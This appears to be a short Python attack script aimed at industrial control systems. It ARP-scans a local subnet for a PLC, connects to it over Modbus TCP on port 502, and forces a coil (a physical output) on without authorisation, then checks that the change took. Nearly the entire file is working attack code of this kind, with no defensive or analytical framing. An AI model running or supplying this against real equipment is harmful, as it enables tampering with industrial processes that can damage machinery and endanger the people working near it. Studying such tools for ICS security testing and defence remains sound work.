import socket
import struct
import time
from pymodbus.client import ModbusTcpClient
from scapy.all import ARP, Ether, srp


# ---- Step 1: Network Scan to Identify PLC IP Address ----
def find_plc_ip(target_subnet="192.168.1.0/24"):
    print("[+] Scanning network for PLC...")
    arp_request = ARP(pdst=target_subnet)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=2, verbose=False)[0]

    for sent, received in result:
        if received.psrc.startswith("192.168.1."):
            print(f"[+] Potential PLC found at: {received.psrc}")
            return received.psrc  # Returning first matched device (adjust filters as needed)
    
    print("[-] No PLC found on the network.")
    return None


# ---- Step 2: Connect to Modbus TCP Server ----
def connect_plc(ip):
    client = ModbusTcpClient(ip, port=502)
    
    if client.connect():
        print(f"[+] Successfully connected to PLC at {ip}")
        return client
    else:
        print(f"[-] Failed to connect to PLC at {ip}")
        return None


# ---- Step 3: Manipulate I/O Image: Force Outputs ----
def force_io_state(client, coil_address=0, force_value=True):
    if client:
        print(f"[+] Forcing Coil at address {coil_address} to value {force_value}")
        client.write_coil(coil_address, force_value)  # Override a digital output
        time.sleep(2)
        
        # Verify change
        result = client.read_coils(coil_address, 1)
        print(f"[+] Coil {coil_address} is now: {result.bits[0]}")
        
        client.close()

# ---- Main Execution ----
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        plc_client = connect_plc(plc_ip)
        
        if plc_client:
            force_io_state(plc_client, coil_address=0, force_value=True)  # Override first output to ON